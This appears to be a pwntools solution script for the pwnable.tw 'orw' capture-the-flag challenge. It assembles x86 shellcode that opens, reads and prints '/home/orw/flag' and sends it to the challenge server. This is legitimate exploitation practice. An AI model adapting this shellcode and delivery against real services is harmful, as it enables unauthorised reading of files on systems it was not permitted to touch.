# pwnable.tw: orw
# woanmeo11

from pwn import *

read_flag = '\n'.join([
    'push %d' % u32('ag\x00\x00'), 
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),

    'mov eax, 5',
    'mov ebx, esp',
    'xor ecx, ecx',
    'xor edx, edx',
    'int 0x80',

    'mov ebx, eax',
    'mov ecx, esp',
    'mov edx, 0x100',
    'int 0x80',

    'mov edx, eax',
    'mov eax, 4',
    'mov ebx, 1',
    'mov ecx, esp',
    'int 0x80',
])

shellcode = asm(read_flag)

r = remote('chall.pwnable.tw', 10001)
r.recv()
r.send(shellcode)
print(r.recv())
